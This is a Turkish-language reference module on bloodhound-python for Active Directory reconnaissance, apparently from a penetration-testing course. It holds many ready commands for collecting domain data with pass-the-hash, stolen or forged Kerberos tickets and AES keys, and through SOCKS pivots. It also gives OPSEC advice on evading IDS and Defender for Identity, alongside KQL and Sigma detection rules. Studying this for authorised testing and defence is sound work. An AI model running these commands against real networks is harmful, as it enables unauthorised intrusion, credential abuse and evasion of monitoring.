# BloodHound.py

> **Kategori:** [3. DİZİN KEŞFİ, GRAF ANALİZİ VE SALDIRI YOLU HARİTALAMA (RECON & BLOODHOUND)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux/Python ortamında çalışan resmi BloodHound veri toplayıcısı; uzaktan LDAP, SMB ve RPC protokolleri üzerinden Pass-the-Hash ve Kerberos biletleriyle uç noktaya dosya bırakmadan AD verisi toplama.

---

## 1. Genel Bakış ve Amaç

`bloodhound-python` (`bloodhound.py`), Dirk-jan Mollema ve açık kaynak topluluğu tarafından geliştirilen, Linux, macOS veya Docker ortamlarından doğrudan hedef Active Directory etki alanına bağlanarak BloodHound (Legacy ve CE) uyumlu JSON ve ZIP arşivleri oluşturan Python tabanlı bir veri toplayıcıdır (Ingestor).

Windows sistemlerinde `SharpHound.exe` çalıştırmak, modern Uç Nokta Tehdit Algılama ve Yanıt (EDR) sistemleri, AppLocker politikaları ve Antivirüs çözümleri tarafından yüksek öncelikli tehdit olarak algılanabilir. `bloodhound-python` bu kısıtlamayı tamamen ortadan kaldırır:
1. **Sıfır Uç Nokta İzi (Zero Endpoint Execution):** Hedef Windows iş istasyonlarına hiçbir `.exe`, `.dll` veya script bırakmadan, tamamen saldırganın kontrolündeki harici bir Linux makinesinden veya pivot tüneli üzerinden çalışır.
2. **Pass-the-Hash (PTH) Desteği:** Düz metin parolası bilinmeyen ancak NTLM hash'i ele geçirilmiş ayrıcalıklı hesaplarla (`--hashes :aad3b4...:31d6...`) tüm etki alanı verilerini toplayabilir.
3. **Kerberos Bilet Entegrasyonu:** Golden Ticket, Silver Ticket veya Linux `ccache` bilet önbelleği (`-k / --kerberos`) kullanılarak parolasız ve NTLM gürültüsü üretmeden çalışabilir.
4. **AES Kerberos Anahtarı Desteği:** Parola veya NTLM hash yerine doğrudan AES-256 (`-aesKey`) anahtarı ile kimlik doğrulayabilir.

### Protokol ve Çalışma Prensibi

`bloodhound-python`, saf Python soketleri ve `ldap3` ile `impacket` kütüphanelerini kullanarak doğrudan etki alanı denetleyicisi ve ağdaki bilgisayarlarla haberleşir:

```
┌──────────────────────────────────────────────────────────────┐
│                  Saldırgan Makinesi (Linux)                  │
│                     [ bloodhound-python ]                    │
└───────────────────┬───────────────────────────────┬──────────┘
                    │                               │
    (A) Dizin Keşfi │                               │ (B) Oturum & Admin Avı
    LDAP / LDAPS    │                               │ SMB / MSRPC (TCP 445 / 135)
    TCP 389 / 636   │                               │ impacket: NetSessionEnum
                    ▼                               ▼
┌──────────────────────────────────────┐   ┌───────────────────────────┐
│        Domain Controller (DC)        │   │    Ağdaki Bilgisayarlar   │
│     [ Active Directory NTDS.DIT ]    │   │ (Workstations / Servers)  │
│                                      │   │                           │
│ - Kullanıcılar, Gruplar, OU'lar      │   │ - Yerel Yöneticiler Grubu │
│ - ACL ve ACE (nTSecurityDescriptor)  │   │ - Aktif Oturumlar (Session│
│ - Domain Trusts ve GPO Kayıtları     │   │ - Kayıtlı Oturum Açanlar  │
└──────────────────────────────────────┘   └───────────────────────────┘
                    │                               │
                    └───────────────┬───────────────┘
                                    ▼
┌──────────────────────────────────────────────────────────────┐
│                  Yerel Çıktı Arşivi (.ZIP)                   │
│   20261014143000_bloodhound.zip (users, groups, computers..) │
│   -> Doğrudan BloodHound CE / Neo4j Arayüzüne Yüklenir!      │
└──────────────────────────────────────────────────────────────┘
```

### Pivot ve SOCKS Tüneli Mimarisi

Bir Linux saldırgan makinesinden izole iç ağdaki Active Directory'yi tararken Ligolo-ng, Chisel veya SSH Dynamic Port Forwarding kullanılır:

```
[ Saldırgan Linux ] ──(SOCKS5 / Port 1080)──► [ DMZ Pivot Sunucu ] ──► [ İç Ağ Domain Controller ]
   bloodhound-python (proxychains --dns-tcp)                               (LDAP 389 / SMB 445)
```

### Neden Önemli?

| Kullanım Senaryosu | Açıklama |
|---|---|
| **Uç Noktada İzsiz Keşif** | Hedef ağdaki iş istasyonlarına EXE çalıştırma riski almadan dışarıdan BloodHound verisi toplama. |
| **Pass-the-Hash ile Toplama** | Parolası bilinmeyen yalnızca NT hash'i olan yönetici hesaplarıyla graf verisi çıkarma. |
| **Pivot & SOCKS Proxy Taraması** | Bir web shell veya Cobalt Strike SOCKS tüneli (`proxychains`) arkasındaki Active Directory'yi tarama. |
| **Kerberos Bilet Uyumluluğu** | `KRB5CCNAME` ortam değişkeniyle Linux bellek biletlerini kullanarak parolasız keşif yapma. |
| **Otomasyon ve CI/CD Entegrasyonu** | Python betikleri ve periyodik cron görevleriyle etki alanı grafını headless olarak güncelleme. |

### Alternatif Araçlarla Karşılaştırma

| Kriter / Yetenek | `BloodHound.py` | `SharpHound.exe` | `ldapdomaindump` | `ADExplorer` |
|---|---|---|---|---|
| **Çalıştırma Ortamı** | Linux / macOS / Docker | Windows (.NET / C#) | Linux / Python | Windows (Sysinternals) |
| **Pass-the-Hash (PTH)** | Var (`--hashes`) | Yok (Windows kısıtı) | Yok (Parola gerektirir) | Yok |
| **Kerberos ccache Bilet** | Var (`-k --no-pass`) | Yok (LUID gerektirir) | Yok | Yok |
| **SOCKS / Tünel Desteği** | Mükemmel (`proxychains`) | Zor (Pivoting gerekir) | Mükemmel | Zor |
| **Oturum (Session) Toplama** | Var (Multi-threaded) | Var (Çok Hızlı) | Yok (Yalnızca LDAP) | Yok |
| **AD CS Desteği** | Gelişmekte / Topluluk | Tam Destek (v2+) | Yok | Var (Ham öznitelik) |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

### Genel Sözdizimi

```bash
bloodhound-python -u <kullanıcı> -p <parola> -d <domain> -dc <DC_FQDN> -c <metotlar> [seçenekler]
```

### Kritik Parametreler ve Açıklamaları

| Parametre | Açıklama | Örnek Kullanım |
|---|---|---|
| `-u, --username <User>` | Kimlik doğrulama için kullanıcı adı. | `-u jdoe` veya `-u 'da_admin'` |
| `-p, --password <Pass>` | Kullanıcı parolası. Parola yoksa veya Kerberos kullanılıyorsa boş bırakılabilir. | `-p 'P@ssw0rd2026!'` |
| `-d, --domain <Domain>` | Hedef etki alanının FQDN adı. | `-d lab.local` |
| `-dc, --domain-controller <Host>` | Hedef Domain Controller'ın FQDN veya IP adresi. | `-dc dc01.lab.local` |
| `-gc, --global-catalog <Host>` | Global Catalog sunucusunun FQDN veya IP adresi (Çoklu domain için). | `-gc dc01.lab.local` |
| `-c, --collectionmethod <Metot>` | Toplama metodunu belirler (`Default`, `All`, `DCOnly`, `Session`, `LocalAdmin` vb.). | `-c DCOnly` |
| `-ns, --nameserver <IP>` | Active Directory DNS sorguları için kullanılacak DNS sunucu IP adresi (Genelde DC IP'si). | `-ns 192.168.1.10` |
| `--dns-tcp` | DNS sorgularını UDP yerine TCP üzerinden gönderir (Proxy ve tünellerde zorunludur). | `--dns-tcp` |
| `--dns-timeout <Saniye>` | DNS sorguları için zaman aşımı süresi. | `--dns-timeout 5` |
| `--hashes [LM:]NT` | Parola yerine NTLM hash'i ile kimlik doğrulama (Pass-the-Hash). | `--hashes :31d6cfe0d16ae...` |
| `-k, --kerberos` | Kerberos kimlik doğrulaması kullanır (ccache biletinden okur). | `-k -no-pass` |
| `--no-pass` | Parola sorma istemini kapatır (Kerberos ile zorunludur). | `--no-pass` |
| `-aesKey <Hex>` | Kerberos kimlik doğrulamasında kullanılacak 128 veya 256-bit AES anahtarı. | `-aesKey 4f8b2...` |
| `-s, --ssl` | Standart port 389 yerine güvenli LDAPS (TCP 636) şifrelemesini zorlar. | `-s` |
| `-w, --workers <Sayı>` | Eşzamanlı çalışacak iş parçacığı (worker thread) sayısı (Varsayılan: 10). | `-w 20` |
| `--zip` | Toplanan JSON dosyalarını otomatik olarak tek bir ZIP arşivi haline getirir. | `--zip` |
| `--exclude-dcs` | Domain Controller sunucularına oturum veya yerel yönetici sorgusu atmaz. | `--exclude-dcs` |

### Modül ve Toplama Ağacı

```
bloodhound-python Toplama Modları
├── 1. DCOnly (Merkezi & Sessiz)
│   ├── Group (Grup üyelikleri ve hiyerarşi)
│   ├── LocalAdmin (DC üzerindeki yerel izinler)
│   ├── Trusts (Etki alanı ve orman güven ilişkileri)
│   ├── ObjectProps (SPN, kilitlenme, süresiz parola vb.)
│   ├── ACL (Erişim denetim listeleri: GenericAll, WriteDacl)
│   └── Container (OU ve GPO yapılandırması)
├── 2. Ağ & Uç Nokta Modları (Tüm bilgisayarları tarar)
│   ├── Session (NetSessionEnum ile aktif kullanıcı oturumları)
│   ├── LoggedOn (Kayıt defteri üzerinden oturum dökümü)
│   └── RDP / DCOM (Uzak Masaüstü ve DCOM yetkileri)
└── 3. Birleşik Seçenekler
    ├── Default (Group, LocalAdmin, Session, Trusts)
    └── All (Tüm LDAP ve SMB metotlarının eksiksiz kombinasyonu)
```

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: DCOnly ile En Sessiz ve Güvenli Uzaktan Keşif

Ağdaki iş istasyonlarına hiçbir paket göndermeden, yalnızca DC ile konuşarak tüm dizin yapısını toplamak:

```bash
bloodhound-python -u 'jdoe' -p 'P@ssw0rd123!' -d 'lab.local' -dc 'dc01.lab.local' -ns 192.168.1.10 -c DCOnly --zip
```

**Konsol Çıktısı Analizi:**
```text
INFO: Found AD domain: lab.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.lab.local
INFO: Found 1 domain controllers
INFO: Querying domain controller for domain information
INFO: Querying domain controller for users
INFO: Querying domain controller for groups
INFO: Querying domain controller for computers
INFO: Querying domain controller for OUs
INFO: Querying domain controller for GPOs
INFO: Querying domain controller for ACLs
INFO: Done in 18.42 seconds. Writing output to 20261014143000_bloodhound.zip
```
- Ağdaki hiçbir iş istasyonuna SMB bağlantısı açılmaz.
- `20261014143000_bloodhound.zip` dosyası anında BloodHound CE'ye aktarılmaya hazırdır.

---

### Senaryo 2: NTLM Hash (Pass-the-Hash) ile Uzaktan Veri Toplama

Parolası kırılmamış ancak SAM/LSASS dökümünden NTLM hash'i elde edilmiş bir etki alanı yöneticisi hesabıyla tarama:

```bash
bloodhound-python -u 'Administrator' --hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -d 'lab.local' -dc '192.168.1.10' -ns 192.168.1.10 -c All --zip
```
- Parola yerine 32 karakterlik NT hash sağlanır (`:NT_HASH` formatı).
- Araç NTLMSSP üzerinden Pass-the-Hash gerçekleştirerek tüm verileri çeker.

---

### Senaryo 3: Kerberos Bileti (ccache) ile Parolasız ve NTLM'siz Toplama

Golden Ticket veya çalınan bir bilet (`.ccache`) ile NTLM trafiği oluşturmadan (OPSEC dostu) tarama yapmak:

```bash
# 1. Kerberos biletini ortam değişkenine bağla
export KRB5CCNAME=/tmp/administrator.ccache

# 2. bloodhound-python ile bileti kullanarak tara
bloodhound-python -k --no-pass -d 'lab.local' -dc 'dc01.lab.local' -ns 192.168.1.10 -c DCOnly --zip
```
- `-k`: Kerberos kimlik doğrulamasını zorlar.
- `--no-pass`: Parola sorma istemini susturur.
- Hedef mutlaka IP adresi değil, **FQDN (`dc01.lab.local`)** olmalıdır.

---

### Senaryo 4: SOCKS Proxy ve Proxychains Üzerinden İç Ağ AD Taraması

Saldırgan bir DMZ sunucusuna sızmış ve SOCKS proxy açmıştır (Örn: Port 1080). İzole iç ağdaki Active Directory yapısını dışarıdan taramak:

```bash
proxychains bloodhound-python -u 'svc_backup' -p 'BackupPass2026!' -d 'corp.local' -dc '10.10.10.1' -ns 10.10.10.1 --dns-tcp -c DCOnly --zip
```
- `--dns-tcp`: DNS sorgularının UDP yerine TCP üzerinden tünellenmesini sağlar (SOCKS4/5 UDP desteklemediği için zorunludur!).
- İç ağdaki DC'ye hiç ayak basmadan tüm Active Directory verisi saldırganın laptop'ına akar.

---

### Senaryo 5: AES-256 Kerberos Anahtarı ile Kimlik Doğrulama

Parola veya NTLM hash yerine doğrudan AES-256 anahtarı kullanarak tarama yapma:

```bash
bloodhound-python -u 'svc_admin' -aesKey e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855 -d 'lab.local' -dc 'dc01.lab.local' -ns 192.168.1.10 -c DCOnly --zip
```
- NTLM trafiği tamamen devre dışı bırakılır; doğrudan Kerberos AS-REQ isteği gönderilir.

---

### Senaryo 6: Global Catalog (`-gc`) ile Çoklu Etki Alanı Orman Taraması

Bir Active Directory ormanındaki tüm alt etki alanlarını (Child Domains) ve güven ilişkilerini Global Catalog üzerinden çıkarma:

```bash
bloodhound-python -u 'jdoe' -p 'Pass123!' -d 'corp.local' -dc 'dc01.corp.local' -gc 'dc01.corp.local' -c Trusts,Group,DCOnly --zip
```
- Port 3268 (GC LDAP) sorgulanarak tüm orman şeması hızlıca taranır.

---

### Senaryo 7: LDAPS (Port 636 TLS) ile Şifreli Ağ Taraması

Ağ sensörlerinin ve IDS sistemlerinin LDAP arama filtrelerini incelemesini engellemek:

```bash
bloodhound-python -u 'jdoe' -p 'P@ssw0rd123!' -d 'lab.local' -dc 'dc01.lab.local' -s --zip
```
- `-s` bayrağı trafiği TLS ile şifreleyerek Snort/Suricata denetimlerini atlatır.

---

### Senaryo 8: DC'leri Hariç Tutup Yalnızca Oturum ve Yerel Yönetici Taraması

Domain Controller'larda MDI alarmı tetiklememek için DC'leri tarama dışı bırakıp yalnızca bilgisayarları taramak:

```bash
bloodhound-python -u 'jdoe' -p 'P@ssw0rd123!' -d 'lab.local' -dc 'dc01.lab.local' -c Session,LocalAdmin --exclude-dcs --zip
```

---

### Senaryo 9: Bash Otomasyon Script'i — Tara ve BloodHound CE REST API'sine Gönder

Toplanan zip dosyasını otomatik olarak BloodHound CE sunucusuna yükleyen entegre Linux betiği:

```bash
#!/usr/bin/env bash
# bloodhound-python çalıştırıp çıktıyı BloodHound CE'ye API ile gönderen otomasyon:

DOMAIN="lab.local"
DC_IP="192.168.1.10"
USER="jdoe"
PASS="Password123!"
BH_API_URL="http://127.0.0.1:8080/api/v1/file-upload/start"
BH_TOKEN="bhe_your_api_token_here"

echo "[*] bloodhound-python DCOnly başlatılıyor..."
OUTPUT_ZIP=$(bloodhound-python -u "$USER" -p "$PASS" -d "$DOMAIN" -dc "$DC_IP" -ns "$DC_IP" -c DCOnly --zip | grep -o '[0-9]*_bloodhound.zip')

if [ -f "$OUTPUT_ZIP" ]; then
    echo "[+] Veri toplandı: $OUTPUT_ZIP"
    echo "[*] BloodHound CE API'sine yükleniyor..."
    curl -s -H "Authorization: Bearer $BH_TOKEN" \
         -H "Content-Type: application/zip" \
         --data-binary @"$OUTPUT_ZIP" \
         "$BH_API_URL"
    echo -e "\n[+] Yükleme tamamlandı!"
else
    echo "[-] Toplama başarısız oldu!"
fi
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Kodu / Mesajı | Olası Neden | Çözüm Adımı |
|---|---|---|
| `ResolutionError: Could not resolve DC` | Linux makinesinin `/etc/resolv.conf` dosyası Active Directory etki alanını çözememektedir. | Komuta `-ns <DC_IP>` parametresi ekleyerek doğrudan etki alanı denetleyicisini DNS sunucusu olarak gösterin. |
| `LDAPSocketOpenError: unable to open socket` | DC IP'sine veya TCP 389 portuna ulaşılamamaktadır (Güvenlik duvarı engeli veya yanlış IP). | IP adresini ve port erişimini `nc -zv <DC_IP> 389` ile test edin. |
| `KerberosSessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Kerberos kullanılırken `-dc` parametresine IP adresi girilmiştir veya SPN çözülememektedir. | `-dc` parametresine mutlaka DC'nin tam FQDN adını (`dc01.lab.local`) girin ve DNS çözümlemesini doğrulayın. |
| `KerberosSessionError: KRB_AP_ERR_SKEW` | Linux makinesinin saati ile hedef DC saati arasında 5 dakikadan fazla fark vardır. | Saatinizi DC ile senkronize edin: `rdate -n <DC_IP>` veya `ntpdate <DC_IP>`. |
| `UnicodeDecodeError: 'utf-8' codec can't decode...` | Active Directory'deki eski nesnelerin açıklama (`description`) alanlarında Türkçe veya bozuk karakterler vardır. | `bloodhound-python` aracını en son sürüme güncelleyin (`pip install --upgrade bloodhound`). |
| `pysmb / Impacket timeout on session collection` | Ağdaki kapalı bilgisayarlara SMB bağlantısı kurulurken çok uzun süre beklenmektedir. | `--workers 20` ile iş parçacığı sayısını artırın veya yalnızca `-c DCOnly` çalıştırın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

### 5.1 Bırakılan İzler (Artifacts & Logs)

- **Uç Noktada Sıfır İz:** Windows iş istasyonlarında hiçbir dosya çalıştırılmaz, bellek enjeksiyonu yapılmaz.
- **Etki Alanı Denetleyicisi Günlükleri (DC Logs):**
  - **Event ID 4624 (Successful Logon - Type 3 / Network):** Saldırganın IP adresinden DC'ye doğru Kerberos veya NTLM ağ oturumu oluşur.
  - **Directory Service Event ID 1644:** Tek bir bağlantı üzerinden binlerce LDAP kaydının çekildiği loglanır.
  - **Event ID 4662 (Directory Service Access):** Nesneler üzerindeki güvenlik tanımlayıcıları (`nTSecurityDescriptor`) okunduğunda oluşur.
- **İş İstasyonu Günlükleri (Yalnızca `All` veya `Session` Kullanıldığında):**
  - **Event ID 5140 / 5145:** Ağ paylaşımı erişimi (`IPC$` paylaşımı üzerinden `NetSessionEnum`).

### 5.2 Ağ ve EDR İmzaları

- **LDAP Trafik Hacmi:** Düz metin LDAP (TCP 389) kullanıldığında, tüm nesne arama filtreleri ağ sensörleri (Zeek, Suricata) tarafından okunabilir.
- **SMB Oturum Taraması (MDI Alarmı):** Eğer `Session` metodu kullanılırsa, Linux makinesinden ağdaki yüzlerce IP'ye doğru TCP 445 bağlantıları açılır. Bu durum Microsoft Defender for Identity (MDI) ve NDR sistemlerinde anında **Reconnaissance using SMB** alarmı üretir.
- **DCOnly Avantajı:** `-c DCOnly` kullanıldığında yalnızca DC ile iletişim kurulduğu için ağ sensörleri bunu standart bir IT yönetim sorgusundan ayırt edemez.

### 5.3 MITRE ATT&CK Eşleştirmesi

| Teknik ID | Teknik Adı | Kullanım Amacı |
|---|---|---|
| **T1087.002** | Account Discovery: Domain Account | Kullanıcı hesapları ve izinlerini uzaktan çekme (`DCOnly`). |
| **T1069.002** | Permission Groups Discovery: Domain Groups | Grup hiyerarşisi ve iç içe geçmiş grupları haritalama. |
| **T1018** | Remote System Discovery | Ağdaki bilgisayarları ve etki alanı denetleyicilerini listeleme. |
| **T1033** | System Owner/User Discovery | Hangi kullanıcının hangi bilgisayarda oturum açtığını tespit etme (`Session`). |
| **T1550.002** | Use Alternate Authentication Material: Pass the Hash | NTLM hash ile parolasız veri toplama (`--hashes`). |

### 5.4 OPSEC Önerileri

| Risk | Önlem / Alternatif Teknik |
|---|---|
| **Ağ Taraması Alarmı (SMB Session Scan)** | Asla kontrolsüzce `-c All` çalıştırmayın; ilk aşamada kesinlikle `-c DCOnly` kullanın. |
| **Ağ Paket Denetimi (Cleartext LDAP)** | Ağ IDS sistemlerinin LDAP filtrelerini okumasını engellemek için `-s` (LDAPS Port 636) bayrağını kullanın. |
| **NTLM Trafik İmzası** | Kurumsal ortamlarda NTLM trafiği izlendiği için NTLM hash yerine Kerberos bileti (`-k --no-pass`) tercih edin. |
| **DC Oturum Taraması Uyarısı** | Oturum toplamak zorundaysanız mutlaka `--exclude-dcs` bayrağını ekleyin. |

### 5.5 Savunma Karşılığı ve Blue Team Tespiti

#### Tespit Kuralı (KQL — Microsoft Sentinel)
```kql
// Anormal LDAP Sorgu Yoğunluğu ve Dış Kaynak Tespiti
DeviceNetworkEvents
| where ActionType == "ConnectionSuccess"
| where RemotePort == 389 or RemotePort == 636
| where InitiatingProcessFileName !in~ ("lsass.exe", "svchost.exe")
| summarize RequestCount = count() by RemoteIP, LocalIP, bin(Timestamp, 10m)
| where RequestCount > 1000
| order by RequestCount desc
```

#### Tespit Kuralı (Sigma — bloodhound-python Tespiti)
```yaml
title: Remote Active Directory Enumeration via BloodHound Python
status: high
logsource:
    category: network_connection
    product: windows
detection:
    selection_ldap:
        DestinationPort: 389
    selection_volume:
        PacketCount|gt: 5000
    condition: selection_ldap and selection_volume
level: high
```

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. DCOnly ile en sessiz uzaktan veri toplama
bloodhound-python -u jdoe -p 'P@ss123!' -d lab.local -dc dc01.lab.local -ns 192.168.1.10 -c DCOnly --zip
```
- **Ne Yapar?** Ağdaki iş istasyonlarına hiç dokunmadan, yalnızca etki alanı denetleyicisi üzerinden kullanıcı, grup, OU, GPO ve ACL verilerini çeker.
- **Ne Zaman Kullanılır?** Uç noktada iz bırakmadan en düşük gürültüyle BloodHound verisi toplamak için.
- **Parametreler:** `-c DCOnly`, `-ns`, `--zip`.

```bash
# 2. Pass-the-Hash (NTLM Hash) ile tüm veriyi toplama
bloodhound-python -u Administrator --hashes :31d6cfe0d16ae931b73c59d7e0c089c0 -d lab.local -dc 192.168.1.10 -ns 192.168.1.10 -c All --zip
```
- **Ne Yapar?** Parola yerine 32 karakterlik NTLM hash'i kullanarak yetkili oturum açar ve tüm ilişkileri toplar.
- **Ne Zaman Kullanılır?** Parolası bilinmeyen bir yönetici hesabının hash'i ele geçirildiğinde.
- **Parametreler:** `--hashes :<NT_HASH>`.

```bash
# 3. Kerberos bileti (TGT/TGS - ccache) ile parolasız toplama
export KRB5CCNAME=admin.ccache
bloodhound-python -k --no-pass -d lab.local -dc dc01.lab.local -ns 192.168.1.10 -c DCOnly --zip
```
- **Ne Yapar?** Linux ortamındaki Kerberos biletini kullanarak NTLM kullanmadan kimlik doğrular.
- **Ne Zaman Kullanılır?** Golden/Silver Ticket üretildiğinde veya bilet ele geçirildiğinde NTLM alarmlarını atlatmak için.
- **Parametreler:** `-k`, `--no-pass`.

```bash
# 4. Proxychains ile SOCKS proxy üzerinden iç ağ taraması
proxychains bloodhound-python -u svc_backup -p 'Pass2026!' -d corp.local -dc 10.10.10.1 -ns 10.10.10.1 --dns-tcp -c DCOnly --zip
```
- **Ne Yapar?** SOCKS proxy tüneli üzerinden iç ağdaki etki alanı denetleyicisini sorgular.
- **Ne Zaman Kullanılır?** Pivot makineler üzerinden izole iç ağ segmentlerini dışarıdan taramak için.
- **Parametreler:** `--dns-tcp`.

```bash
# 5. AES-256 Kerberos anahtarı ile kimlik doğrulama
bloodhound-python -u svc_admin -aesKey 4f8b2c... -d lab.local -dc dc01.lab.local -ns 192.168.1.10 -c DCOnly --zip
```
- **Ne Yapar?** Parola girmeden doğrudan AES-256 anahtarı ile Kerberos oturumu açar.
- **Ne Zaman Kullanılır?:** Parola bilinmediğinde veya Kerberoasting sonrası elde edilen AES anahtarlarıyla.
- **Parametreler:** `-aesKey`.

```bash
# 6. Global Catalog (-gc) üzerinden orman çapında tarama
bloodhound-python -u jdoe -p 'Pass123!' -d corp.local -dc dc01.corp.local -gc dc01.corp.local -c Trusts,Group,DCOnly --zip
```
- **Ne Yapar?:** Port 3268 Global Catalog üzerinden ormandaki tüm etki alanlarını ve güven ilişkilerini toplar.
- **Ne Zaman Kullanılır?:** Çoklu domain yapılarında orman çapında harita çıkarmak için.
- **Parametreler:** `-gc`.

```bash
# 7. DC'leri hariç tutup oturum ve yerel yönetici taraması
bloodhound-python -u jdoe -p 'Pass123!' -d lab.local -dc dc01.lab.local -c Session,LocalAdmin --exclude-dcs --zip
```
- **Ne Yapar?** Domain Controller'ları atlayarak yalnızca iş istasyonlarındaki oturum ve yerel admin verilerini toplar.
- **Ne Zaman Kullanılır?** DC üzerindeki MDI ve SMB alarmlarını tetiklemeden kullanıcı avı (User Hunting) yapmak için.
- **Parametreler:** `--exclude-dcs`.

```bash
# 8. LDAPS (SSL/TLS) şifreli bağlantı zorlama
bloodhound-python -u jdoe -p 'Pass123!' -d lab.local -dc dc01.lab.local -s -ns 192.168.1.10 -c DCOnly --zip
```
- **Ne Yapar?** LDAP sorgularını TCP 636 üzerinden TLS ile şifreleyerek iletir.
- **Ne Zaman Kullanılır?** Ağ tabanlı IDS/IPS cihazlarının arama filtrelerini incelemesini engellemek için.
- **Parametreler:** `-s`.

```bash
# 9. Çok iş parçacıklı hızlı tarama (-w 25)
bloodhound-python -u jdoe -p 'Pass123!' -d lab.local -dc dc01.lab.local -c All -w 25 --zip
```
- **Ne Yapar?** Eşzamanlı iş parçacığı sayısını 25'e çıkararak ağ taramasını hızlandırır.
- **Ne Zaman Kullanılır?** Geniş ağlarda oturum toplama süresini kısaltmak için.
- **Parametreler:** `-w 25`.

```bash
# 10. Belirli bilgisayar sınıflarını dahil etme (--add-computer-class)
bloodhound-python -u jdoe -p 'Pass123!' -d lab.local -dc dc01.lab.local -c DCOnly --add-computer-class ms-MCS-AdmPwd --zip
```
- **Ne Yapar?:** LAPS parolaları dahil olmak üzere bilgisayar nesnelerinin ek özniteliklerini toplar.
- **Ne Zaman Kullanılır?:** LAPS ve özel bilgisayar izinlerini grafik üzerinde incelemek için.
- **Parametreler:** `--add-computer-class`.

---

## Kaynaklar

- **bloodhound-python Resmi GitHub Reposu:** [https://github.com/dirkjanm/BloodHound.py](https://github.com/dirkjanm/BloodHound.py)
- **SpecterOps BloodHound Çatısı:** [https://github.com/SpecterOps/BloodHound](https://github.com/SpecterOps/BloodHound)
- **MITRE ATT&CK T1087.002:** [https://attack.mitre.org/techniques/T1087/002/](https://attack.mitre.org/techniques/T1087/002/)
- **Dirk-jan Mollema — Active Directory Security Research:** [https://dirkjanm.io/](https://dirkjanm.io/)

---

> **Önceki:** [← SharpHound](./SharpHound.md) · **Sonraki:** [AzureHound →](./AzureHound.md)
